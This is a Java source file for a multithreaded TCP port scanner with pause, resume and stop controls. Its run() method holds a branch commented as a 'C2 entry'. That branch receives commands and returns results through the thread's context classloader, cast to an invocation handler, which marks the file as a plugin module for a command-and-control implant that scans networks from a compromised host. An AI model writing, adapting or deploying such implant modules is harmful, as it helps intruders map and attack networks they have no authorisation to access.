package org.leo.core.component;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 端口扫描组件
 * 提供多线程异步端口扫描功能，兼容Java 1.5+
 *
 * @author LeoSpring
 * @version 2.1
 */
public class PortScanComponent implements Runnable {

    private HashMap params;
    private HashMap results;


    // 存储所有扫描任务的状态和结果
    private static ConcurrentHashMap scanTasks = new ConcurrentHashMap();
    
    // 存储每个任务的锁对象（用于暂停/继续）
    private static ConcurrentHashMap taskLocks = new ConcurrentHashMap();
    
    // 扫描任务状态常量
    private static final String STATE_RUNNING = "RUNNING";
    private static final String STATE_PAUSED = "PAUSED";
    private static final String STATE_STOPPED = "STOPPED";


    // 用于单个端口扫描的实例变量
    private String scanHost;
    private Integer scanPort;
    private int scanTimeout;

    private String taskId;



    



    public void invoke() throws Exception {
        String methodName= (String) params.get("methodName");
        if (methodName.equals("startScan")){
            String taskId=startScan(params);
            results.put("taskId",taskId);
            results.put("code",200);
        }
        if (methodName.equals("queryResult")){
            String taskId= (String) params.get("taskId");
            HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
            if (scanTaskInfo != null) {
                // 提取已扫描端口数
                AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
                if (completedCount != null) {
                    scanTaskInfo.put("scannedCount", completedCount.get());
                }
            }
            results.put("scanTaskInfo",scanTaskInfo);
            results.put("code",200);
        }
        if (methodName.equals("pauseScan")){
            String taskId= (String) params.get("taskId");
            pauseScan(taskId);
            results.put("code",200);
            results.put("msg","暂停扫描成功");
        }
        if (methodName.equals("resumeScan")){
            String taskId= (String) params.get("taskId");
            resumeScan(taskId);
            results.put("code",200);
            results.put("msg","继续扫描成功");
        }
        if (methodName.equals("stopScan")){
            String taskId= (String) params.get("taskId");
            stopScan(taskId);
            results.put("code",200);
            results.put("msg","终止扫描成功");
        }

    }

    public PortScanComponent() {
    }

    public PortScanComponent(String scanHost, Integer scanPort, int scanTimeout, String taskId) {
        this.scanHost = scanHost;
        this.scanPort = scanPort;
        this.scanTimeout = scanTimeout;
        this.taskId=taskId;
    }

    @Override
    public void run() {
        // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
        if (scanHost == null) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            return; // 任务不存在，直接返回
        }
        
        // 获取任务的锁对象
        Object lock = taskLocks.get(taskId);
        if (lock == null) {
            lock = new Object();
            Object existing = taskLocks.putIfAbsent(taskId, lock);
            if (existing != null) {
                lock = existing;
            }
        }
        
        // 等待直到任务状态为运行中或已终止
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            while (STATE_PAUSED.equals(status)) {
                try {
                    lock.wait(); // 暂停时等待
                    status = (String) scanTaskInfo.get("status");
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
            
            // 如果已终止，直接返回
            if (STATE_STOPPED.equals(status)) {
                return;
            }
        }
        
        // 执行扫描
        List openPortList= (List) scanTaskInfo.get("openPortList");
        AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
        int portLength=((Number) scanTaskInfo.get("portLength")).intValue();
        
        // 再次检查状态（可能在等待期间被终止）
        String status = (String) scanTaskInfo.get("status");
        if (STATE_STOPPED.equals(status)) {
            return;
        }
        
        if (scanPort(scanHost,scanPort,scanTimeout)){
            openPortList.add(scanPort);
        }
        // 增加已完成计数
        int count = completedCount.incrementAndGet();
        // 使用同步块确保状态更新的原子性
        synchronized (scanTaskInfo) {
            if (count == portLength){
                scanTaskInfo.put("status", STATE_STOPPED);
            }
        }
    }


    private String startScan(HashMap params){
        String scanHost= (String) params.get("scanHost");
        int[] scanPorts= (int[]) params.get("scanPorts");
        int scanTimeout= ((Number) params.get("scanTimeout")).intValue();
        int threadsNum= ((Number) params.get("threadsNum")).intValue();
        ExecutorService pool = Executors.newFixedThreadPool(threadsNum);

        HashMap scanTaskInfo=new HashMap();
        String taskId=UUID.randomUUID().toString();
        scanTaskInfo.put("taskId",taskId);
        scanTaskInfo.put("status", STATE_RUNNING); // 使用status记录状态，初始为运行中
        scanTaskInfo.put("portLength",scanPorts.length);
        // 为任务创建锁对象
        taskLocks.put(taskId, new Object());
        // 使用线程安全的列表
        scanTaskInfo.put("openPortList",Collections.synchronizedList(new ArrayList()));
        // 使用原子计数器跟踪已完成的扫描数量
        scanTaskInfo.put("completedCount",new AtomicInteger(0));
        scanTasks.put(taskId,scanTaskInfo);
        for (int scanPort: scanPorts) {
            pool.execute(new PortScanComponent(scanHost,scanPort,scanTimeout,taskId));
        }
        pool.shutdown();
        return taskId;
    }

    private Boolean scanPort(String host,int port,int scanTimeout){
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), scanTimeout);
            return true;
        } catch (Exception var14) {
            return false;
        }finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception ignored) {}
            }
        }
    }
    
    /**
     * 暂停扫描任务
     */
    private void pauseScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        String status = (String) scanTaskInfo.get("status");
        if (STATE_STOPPED.equals(status)) {
            throw new Exception("任务已终止，无法暂停");
        }
        if (STATE_PAUSED.equals(status)) {
            throw new Exception("任务已处于暂停状态");
        }
        synchronized (scanTaskInfo) {
            scanTaskInfo.put("status", STATE_PAUSED);
        }
    }
    
    /**
     * 继续扫描任务
     */
    private void resumeScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        String status = (String) scanTaskInfo.get("status");
        if (STATE_STOPPED.equals(status)) {
            throw new Exception("任务已终止，无法继续");
        }
        if (STATE_RUNNING.equals(status)) {
            throw new Exception("任务正在运行中，无需继续");
        }
        synchronized (scanTaskInfo) {
            scanTaskInfo.put("status", STATE_RUNNING);
            Object lock = taskLocks.get(taskId);
            if (lock != null) {
                synchronized (lock) {
                    lock.notifyAll(); // 唤醒所有等待的线程
                }
            }
        }
    }
    
    /**
     * 终止扫描任务
     */
    private void stopScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        String status = (String) scanTaskInfo.get("status");
        if (STATE_STOPPED.equals(status)) {
            throw new Exception("任务已终止");
        }
        synchronized (scanTaskInfo) {
            scanTaskInfo.put("status", STATE_STOPPED);
            Object lock = taskLocks.get(taskId);
            if (lock != null) {
                synchronized (lock) {
                    lock.notifyAll(); // 唤醒所有等待的线程
                }
            }
        }
    }
}
